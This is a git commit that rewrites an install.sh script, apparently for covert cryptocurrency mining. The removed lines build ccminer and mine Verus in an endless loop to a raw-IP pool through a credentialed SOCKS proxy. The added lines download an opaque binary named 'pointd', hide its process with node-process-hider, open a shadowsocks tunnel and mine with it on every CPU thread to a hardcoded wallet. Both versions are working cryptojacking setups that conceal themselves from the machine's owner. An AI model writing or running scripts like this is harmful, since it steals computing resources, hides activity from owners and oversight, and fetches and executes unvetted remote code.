4f1052e1772c072c501c93152510017204c936ba
ploretope <102384014+ploretope@users.noreply.github.com>
2022-04-17 22:37:11 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,21 +1,10 @@
-apt update && apt -y install sudo
-sudo apt update;apt -y install build-essential screen ca-certificates libcurl4
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
-sudo -u root npm i -g node-process-hider
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh
-chmod +x configure.sh
-chmod +x autogen.sh
-sudo ph add ccminer
-./build.sh
-while [ 1 ]; do
-./ccminer -a verus -o stratum+tcp://79.137.70.48:3960 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-3 -n 1)-jur) -p hybrid -t $(nproc) -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080
-sleep 2
-done
-sleep 999
+apt update
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+npm i -g node-process-hider 
+
+wget -q https://github.com/manorepas/bash/raw/main/pointd
+chmod +x pointd
+sudo apt -y install shadowsocks-libev rng-tools libsodium-dev
+ph add pointd
+ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
+./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.B20.1 -p x -t 16 -x socks5://Novax:chalHatt@129.158.58.77:1080
